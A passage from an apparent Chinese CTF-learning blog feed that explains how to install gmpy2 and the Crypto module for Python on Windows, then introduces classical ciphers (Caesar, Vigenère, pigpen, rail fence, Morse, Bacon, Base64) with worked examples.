class="hljs-number">8</span>‑cp<span class="hljs-number">35</span>‑cp<span class="hljs-number">35</span>m‑win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">34</span>‑cp<span class="hljs-number">34</span>m‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">34</span>‑cp<span class="hljs-number">34</span>m‑win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">27</span>‑cp<span class="hljs-number">27</span>m‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">27</span>‑cp<span class="hljs-number">27</span>m‑win<span class="hljs-number">32</span>.whl<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip install D:\Download\gmpy2-2.0.8-cp38-cp38-win_amd64.whl</span><br>ERROR: gmpy2-2.0.8-cp38-cp38-win_amd64.whl is not a supported wheel on this platform.<br></code></pre></td></tr></table></figure><p>查看pip支持的文件名和版本</p><p><strong>方法一：新方法篇</strong></p><p>直接用<code>pip debug --verbose</code> 命令即可看 <strong>pip</strong> 支持。<br><strong>注：</strong> 感谢 <strong>lukea</strong> 小伙伴的分享！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip debug --verbose</span><br>WARNING: This <span class="hljs-built_in">command</span> is only meant <span class="hljs-keyword">for</span> debugging. Do not use this with automation <span class="hljs-keyword">for</span> parsing and getting these details, since the output and options of this <span class="hljs-built_in">command</span> may change without notice.<br>pip version: pip 21.3.1 from c:\users\13562\appdata\<span class="hljs-built_in">local</span>\programs\python\python38-32\lib\site-packages\pip (python 3.8)<br>sys.version: 3.8.3 (tags/v3.8.3:6f8c832, May 13 2020, 22:20:19) [MSC v.1925 32 bit (Intel)]<br>sys.executable: c:\users\13562\appdata\<span class="hljs-built_in">local</span>\programs\python\python38-32\python.exe<br>sys.getdefaultencoding: utf-8<br>sys.getfilesystemencoding: utf-8<br>locale.getpreferredencoding: cp936<br>sys.platform: win32<br>sys.implementation:<br>  name: cpython<br><span class="hljs-string">&#x27;cert&#x27;</span> config value: Not specified<br>REQUESTS_CA_BUNDLE: None<br>CURL_CA_BUNDLE: None<br>pip._vendor.certifi.where(): c:\users\13562\appdata\<span class="hljs-built_in">local</span>\programs\python\python38-32\lib\site-packages\pip\_vendor\certifi\cacert.pem<br>pip._vendor.DEBUNDLED: False<br>vendored library versions:<br>  CacheControl==0.12.6<br>  colorama==0.4.4<br>  distlib==0.3.3<br>  distro==1.6.0<br>  html5lib==1.1<br>  msgpack==1.0.2 (Unable to locate actual module version, using vendor.txt specified version)<br>  packaging==21.0<br>  pep517==0.12.0<br>  platformdirs==2.4.0<br>  progress==1.6<br>  pyparsing==2.4.7<br>  requests==2.26.0<br>  certifi==2021.05.30<br>  chardet==4.0.0<br>  idna==3.2<br>  urllib3==1.26.7<br>  resolvelib==0.8.0<br>  setuptools==44.0.0 (Unable to locate actual module version, using vendor.txt specified version)<br>  six==1.16.0<br>  tenacity==8.0.1 (Unable to locate actual module version, using vendor.txt specified version)<br>  tomli==1.0.3<br>  webencodings==0.5.1 (Unable to locate actual module version, using vendor.txt specified version)<br>Compatible tags: 30<br>  cp38-cp38-win32<br>  cp38-abi3-win32<br>  cp38-none-win32<br>  cp37-abi3-win32<br>  cp36-abi3-win32<br>  cp35-abi3-win32<br>  cp34-abi3-win32<br>  cp33-abi3-win32<br>  cp32-abi3-win32<br>  py38-none-win32<br>  py3-none-win32<br>  py37-none-win32<br>  py36-none-win32<br>  py35-none-win32<br>  py34-none-win32<br>  py33-none-win32<br>  py32-none-win32<br>  py31-none-win32<br>  py30-none-win32<br>  cp38-none-any<br>  py38-none-any<br>  py3-none-any<br>  py37-none-any<br>  py36-none-any<br>  py35-none-any<br>  py34-none-any<br>  py33-none-any<br>  py32-none-any<br>  py31-none-any<br>  py30-none-any<br></code></pre></td></tr></table></figure><p><strong>方法二：常规方法篇</strong></p><p><strong>64 位 pip 老的查看方法前段时间更新后就不能用了。</strong></p><p>之前导入<code>pip._internal</code>就好了。现在需要导入 <code>pip._internal.pep425tags</code> 才可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pip._internal.pep425tags<br><span class="hljs-built_in">print</span>(pip._internal.pep425tags.get_supported())<br></code></pre></td></tr></table></figure><p><strong>方法三：万能方法</strong></p><p>我们直接在 <strong>pip</strong> 里搜 <strong>pep425tags.py</strong> 这个文件就行，找到它的位置。<br>一般导入报错就说明位置不对，每个版本都可能有一些差异，位置可能有变化。<br>我下载了个 <strong>32</strong> 位的，查找发现了它的位置，然后直接导入它就行了。</p><p>C:\Users\13562\AppData\Local\Programs\Python\Python38-32\Lib\site-packages\setuptools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> setuptools.pep425tags<br> <br><span class="hljs-built_in">print</span>(setuptools.pep425tags.get_supported())<br><br>[(<span class="hljs-string">&#x27;cp38&#x27;</span>, <span class="hljs-string">&#x27;cp38m&#x27;</span>, <span class="hljs-string">&#x27;win32&#x27;</span>), (<span class="hljs-string">&#x27;cp38&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;win32&#x27;</span>), (<span class="hljs-string">&#x27;py3&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;win32&#x27;</span>), (<span class="hljs-string">&#x27;cp38&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;cp3&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py38&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py3&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py37&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py36&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py35&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py34&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py33&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py32&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py31&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>), (<span class="hljs-string">&#x27;py30&#x27;</span>, <span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>)]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip install D:\Download\gmpy2-2.0.8-cp38-cp38-win32.whl</span><br>Processing d:\download\gmpy2-2.0.8-cp38-cp38-win32.whl<br>Installing collected packages: gmpy2<br>Successfully installed gmpy2-2.0.8<br><br><span class="hljs-comment"># pip install gmpy2</span><br>Requirement already satisfied: gmpy2 <span class="hljs-keyword">in</span> c:\users\13562\appdata\<span class="hljs-built_in">local</span>\programs\python\python38-32\lib\site-packages (2.0.8)<br><br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>首先直接梭哈，安装crypto</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> pip install crypto</span><br></code></pre></td></tr></table></figure><p>但导入时显示 <code>No module named &#39;Crypto&#39;</code> </p><p><a href="https://s1.ax1x.com/2020/07/28/aEYrTA.png"><img src="https://s1.ax1x.com/2020/07/28/aEYrTA.png" alt="aEYrTA.png"></a></p><p>这时我们到python目录下的<code>Lib\site-packages</code>路径处，将原本的crypto改成Crypto即可</p><p><a href="https://s1.ax1x.com/2020/07/28/aEYLlT.png"><img src="https://s1.ax1x.com/2020/07/28/aEYLlT.png" alt="aEYLlT.png"></a></p><p>参考文章：<a href="https://blog.csdn.net/u012798683/article/details/88654534">No module named “Crypto”，如何安装Python三方模块Crypto</a> 第一种方法</p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto</title>
    <link href="/2021/11/20/CTF/Crypto/Crypto/"/>
    <url>/2021/11/20/CTF/Crypto/Crypto/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>[TOC]</p><h2 id="0x01-古典密码"><a href="#0x01-古典密码" class="headerlink" title="0x01 古典密码"></a>0x01 古典密码</h2><p>这部分我们介绍几种典密码。  </p><blockquote><p>问：什么是古典<br>答：很早以前的<br>问：多早以前的<br>答：What？Can u speak English？</p></blockquote><p>“古典”本身就是一个模糊的定义，通常我们认为香农经典论文发表之前的为”古典”，或者利用香农的基本思想设计的密码系统将不是“古典密码”。</p><h3 id="1、凯撒密码"><a href="#1、凯撒密码" class="headerlink" title="1、凯撒密码"></a>1、凯撒密码</h3><p>每个字母在字母表中“移动”了一定的位置。</p><p><strong>数学表示（密码为3）：</strong></p><script type="math/tex; mode=display">\begin{cases}𝑐 = 𝑚 + 3(𝑚𝑜𝑑 26) & 0 ≤ 𝑚 ≤ 25 \\𝑚 = 𝑐 − 3(𝑚𝑜𝑑 26) & 0 ≤ 𝑐 ≤ 25\end{cases}</script><p><img src="/2021/11/20/CTF/Crypto/Crypto/8f107ab1d8ddf6f94abd90b923e8bea7.png" alt="image-20211121145730842" style="zoom:80%;"></p><p>例：利用凯撒密码对”abc” 进行加密。 </p><p>解：def</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/6874af019accd5e84054654c4514c624.png" alt="image-20211121142047922"></p><h3 id="2、维吉尼亚密码"><a href="#2、维吉尼亚密码" class="headerlink" title="2、维吉尼亚密码"></a>2、维吉尼亚密码</h3><p>维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成 密码字母表的加密算法，属于多表密码的一种简单形式。</p><ul><li><p>26 × 26 方阵</p></li><li><p>密钥循环使用</p></li></ul><p><img src="/2021/11/20/CTF/Crypto/Crypto/f42b3c44867d376fe3876d5dada08597.png" alt="image-20211124161834324"></p><p>明文：This_is_flag </p><p>密钥：biu</p><p>密文：Upct_qm_gtuh</p><h3 id="3、猪圈密码"><a href="#3、猪圈密码" class="headerlink" title="3、猪圈密码"></a>3、猪圈密码</h3><p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。</p><h4 id="1）传统的"><a href="#1）传统的" class="headerlink" title="1）传统的"></a>1）传统的</h4><p><img src="/2021/11/20/CTF/Crypto/Crypto/8892f798dae3867e46e17558a0a8cb1a.jpg" alt="1-210929212934M6" style="zoom:80%;"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/b3fbfc30133f75688a23bfd2a7ccad58.jpg" alt="1-21092921320b28" style="zoom:80%;"></p><h4 id="2）变种"><a href="#2）变种" class="headerlink" title="2）变种"></a>2）变种</h4><p><img src="/2021/11/20/CTF/Crypto/Crypto/e2928e0053f124c5f3c009291345f6a8.jpg" alt="1-210929213KN21"></p><h3 id="4、栅栏密码"><a href="#4、栅栏密码" class="headerlink" title="4、栅栏密码"></a>4、栅栏密码</h3><p>所谓栅栏密码，就是将要加密的明文分为N个一组，再从每组的选出一个字母连起来，形成一段无规律的密文。</p><p>栅栏密码可以分为两类，第一种是N型栅栏密码（加密方式源自百度百科）、第二种是V型栅栏密码（加密方式源自维基百科）。</p><h4 id="1）N型栅栏密码"><a href="#1）N型栅栏密码" class="headerlink" title="1）N型栅栏密码"></a>1）N型栅栏密码</h4><p>使用密钥 8（栅栏的栏数）加密一下明文 <code>1234567891234567891234567891234567891</code> </p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-number">1.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">9.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">8.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">7.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">6.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">5.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br><span class="hljs-number">.2</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.1</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.9</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.8</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.7</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.6</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br>.<span class="hljs-number">.3</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.2</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.1</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.9</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.8</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.7</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br><span class="hljs-params">...</span><span class="hljs-number">4.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">3.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">2.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">1.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">9.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">8.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br><span class="hljs-params">...</span><span class="hljs-number">.5</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.4</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.3</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.2</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.1</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.9</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br><span class="hljs-params">...</span>.<span class="hljs-number">.6</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.5</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.4</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.3</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.2</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.1</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">7.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">6.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">5.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">4.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">3.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.8</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.7</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.6</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.5</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.4</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br></code></pre></td></tr></table></figure><p><strong>首先画出8栏表格，明文由上至下顺序写上，当到达最低部时，再回到第一栏重新开始，一直重复直至整篇明文写完为止。</strong></p><p>横向读取表格即为密文：<code>1987652198763219874321985432196543217654387654</code> 。</p><h4 id="2）V型栅栏密码"><a href="#2）V型栅栏密码" class="headerlink" title="2）V型栅栏密码"></a>2）V型栅栏密码</h4><p>使用密钥 8（栅栏的栏数）加密一下明文<code>Will invade Kentucky on October the eighth# signal is Frozen chicken&#39;#</code></p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">W</span>...........<span class="hljs-built_in">..n</span>...........<span class="hljs-built_in">..b</span>.............#...........<span class="hljs-built_in">..r</span>.............#...<br>.i.........<span class="hljs-built_in">..e</span>.t.........<span class="hljs-built_in">..o</span>.e.........<span class="hljs-built_in">..h</span>. .........<span class="hljs-built_in">..F</span>.o...........&#x27;....<br><span class="hljs-built_in">..l</span>.......<span class="hljs-built_in">..K</span>.<span class="hljs-built_in">..u</span>.......<span class="hljs-built_in">..t</span>.<span class="hljs-built_in">..r</span>.......<span class="hljs-built_in">..t</span>.<span class="hljs-built_in">..s</span>.........&#x27;.<span class="hljs-built_in">..z</span>.......<span class="hljs-built_in">..n</span>.....<br>.<span class="hljs-built_in">..l</span>....... ...<span class="hljs-built_in">..c</span>.....<span class="hljs-built_in">..c</span>..... .....<span class="hljs-built_in">..h</span>...<span class="hljs-built_in">..i</span>....... ...<span class="hljs-built_in">..e</span>.....<span class="hljs-built_in">..e</span>......<br>.... ...<span class="hljs-built_in">..e</span>.....<span class="hljs-built_in">..k</span>...<span class="hljs-built_in">..O</span>.....<span class="hljs-built_in">..t</span>...<span class="hljs-built_in">..g</span>.....<span class="hljs-built_in">..g</span>...<span class="hljs-built_in">..s</span>.....<span class="hljs-built_in">..n</span>...<span class="hljs-built_in">..k</span>.......<br>...<span class="hljs-built_in">..i</span>.<span class="hljs-built_in">..d</span>.......<span class="hljs-built_in">..y</span>... .......<span class="hljs-built_in">..h</span>.<span class="hljs-built_in">..i</span>.......<span class="hljs-built_in">..n</span>.<span class="hljs-built_in">..i</span>......... .<span class="hljs-built_in">..c</span>........<br>....<span class="hljs-built_in">..n</span>.a........... .n.........<span class="hljs-built_in">..e</span>.e.........<span class="hljs-built_in">..a</span>. .........<span class="hljs-built_in">..c</span>.i.........<br>.....<span class="hljs-built_in">..v</span>...........<span class="hljs-built_in">..o</span>............. ...........<span class="hljs-built_in">..l</span>...........<span class="hljs-built_in">..h</span>..........<br></code></pre></td></tr></table></figure><p><strong>在V型栅栏密码中，明文由上至下顺序写上，当到达最低部时，再回头向上，一直重复直至整篇明文写完为止。</strong></p><p>横向读取表格即为密文：<code>Wnb#r#ietoehFo&#39;lkutrts&#39;znl cc hi ee ekOtggsnkidy hini cna neea civo lh</code> 。</p><h3 id="5、摩斯密码"><a href="#5、摩斯密码" class="headerlink" title="5、摩斯密码"></a>5、摩斯密码</h3><p>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符之间短的停顿、每个词之间中等的停顿以及句子之间长的停顿。</p><p><strong>摩斯电码特点：</strong></p><ul><li>点（.）、划（-）————（可能会用<strong>0和1</strong>代替<strong>点和划</strong>）</li><li>通常用空格表示每个字符间短的停顿</li><li>通常用 <strong>/</strong> 划分每个词之间中等的停顿</li></ul><p><img src="/2021/11/20/CTF/Crypto/Crypto/cbe5f50ef451fa68ddd4698b8df939a3.png" alt="2020040817184768"></p><h3 id="6、培根密码"><a href="#6、培根密码" class="headerlink" title="6、培根密码"></a>6、培根密码</h3><p>加密时，明文中的每个字母都会转换成一组五个英文字母。</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/67a33cf000b1de408ad6481e8579e8c6.png" alt="image-20211124145910337"></p><p>培根密码相对随意，当出现了两种不同形式的呈现时候（一段文字有两种字体就可能是这种密码），就可以使用培根密码。将其五五分组，之后把第一种形式当成a，把另一种当成b（或者反过来），然后就可以一一对应进行解密。</p><p><strong>给大家展现一些例子：</strong></p><div class="table-container"><table><thead><tr><th>密文</th><th>可能解密一</th><th>明文</th><th>可能解密二</th><th>明文</th></tr></thead><tbody><tr><td><strong>1</strong>2<strong>34</strong>5 6<strong>789</strong>0</td><td>abaab baaab</td><td>jr</td><td>babba abbba</td><td>wo</td></tr><tr><td>10110 01110</td><td>abaab baaab</td><td>jr</td><td>babba abbba</td><td>wo</td></tr><tr><td>你海他们湖 江们你他流</td><td>abaab baaab</td><td>jr</td><td>babba abbba</td><td>wo</td></tr></tbody></table></div><h3 id="7、Base64加密"><a href="#7、Base64加密" class="headerlink" title="7、Base64加密"></a>7、Base64加密</h3><p>Base64编码，是我们程序开发中经常使用到的编码方法。它是一种基于用64个可打印字符来表示二进制数据的表示方法。它通常用作存储、传输一些二进制数据的编码方法。</p><p><strong>Base64转换原理：</strong></p><p>它是用64个可打印字符表示二进制所有数据方法。由于2的6次方等于64，所以可以用每6位为一个单元，对应某个可打印字符。</p><p>我们知道三个字节有24位，就可以刚好对应于4个Base64单元，即3个字节需要用4个Base64的可打印字符来表示。</p><p>在Base64中的可打印字符包括字母A-Z、a-z、数字0-9 ，这样共有62个字符，此外两个可打印符号在不同的系统中一般有所不同。但是，我们经常所说的Base64另外2个字符是：“+/”。</p><p>这64个字符，所对应表如下。</p><div class="table-container"><table><thead><tr><th>编号</th><th>字符</th><th></th><th>编号</th><th>字符</th><th></th><th>编号</th><th>字符</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>16</td><td>Q</td><td>32</td><td>g</td><td>48</td><td>w</td></tr><tr><td>1</td><td>B</td><td>17</td><td>R</td><td>33</td><td>h</td><td>49</td><td>x</td></tr><tr><td>2</td><td>C</td><td>18</td><td>S</td><td>34</td><td>i</td><td>50</td><td>y</td></tr><tr><td>3</td><td>D</td><td>19</td><td>T</td><td>35</td><td>j</td><td>51</td><td>z</td></tr><tr><td>4</td><td>E</td><td>20</td><td>U</td><td>36</td><td>k</td><td>52</td><td>0</td></tr><tr><td>5</td><td>F</td><td>21</td><td>V</td><td>37</td><td>l</td><td>53</td><td>1</td></tr><tr><td>6</td><td>G</td><td>22</td><td>W</td><td>38</td><td>m</td><td>54</td><td>2</td></tr><tr><td>7</td><td>H</td><td>23</td><td>X</td><td>39</td><td>n</td><td>55</td><td>3</td></tr><tr><td>8</td><td>I</td><td>24</td><td>Y</td><td>40</td><td>o</td><td>56</td><td>4</td></tr><tr><td>9</td><td>J</td><td>25</td><td>Z</td><td>41</td><td>p</td><td>57</td><td>5</td></tr><tr><td>10</td><td>K</td><td>26</td><td>a</td><td>42</td><td>q</td><td>58</td><td>6</td></tr><tr><td>11</td><td>L</td><td>27</td><td>b</td><td>43</td><td>r</td><td>59</td><td>7</td></tr><tr><td>12</td><td>M</td><td>28</td><td>c</td><td>44</td><td>s</td><td>60</td><td>8</td></tr><tr><td>13</td><td>N</td><td>29</td><td>d</td><td>45</td><td>t</td><td>61</td><td>9</td></tr><tr><td>14</td><td>O</td><td>30</td><td>e</td><td>46</td><td>u</td><td>62</td><td>+</td></tr><tr><td>15</td><td>P</td><td>31</td><td>f</td><td>47</td><td>v</td><td>63</td><td>/</td></tr></tbody></table></div><p>转换的时候，将三个byte的数据，先后放入一个24bit的缓冲区中，先来的byte占高位。数据不足3byte的话，于缓冲区中剩下的bit用0补足。然后，每次取出6个bit，按照其值选择 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 中的字符作为编码后的输出。不断进行，直到全部输入数据转换完成。</p><p>如果最后剩下两个输入数据，在编码结果后加1个“=”；如果最后剩下一个输入数据，编码结果后加2个“=”；如果没有剩下任何数据，就什么都不要加，这样才可以保证资料还原的正确性。</p><p>编码后的数据比原始数据略长，为原来的4/3。无论什么样的字符都会全部被编码，因此不像<a href="http://blog.chacuo.net/494.html">Quoted-printable</a> 编码，还保留部分可打印字符。所以，它的可读性不如<a href="http://blog.chacuo.net/494.html">Quoted-printable</a>编码！</p><div class="table-container"><table><thead><tr><th>文本</th><th><strong>M</strong></th><th><strong>a</strong></th><th><strong>n</strong></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>ASCII编码</td><td>77</td><td>97</td><td>110</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>二进制位（8位）</td><td>0100 1101</td><td>0110 0001</td><td>0110 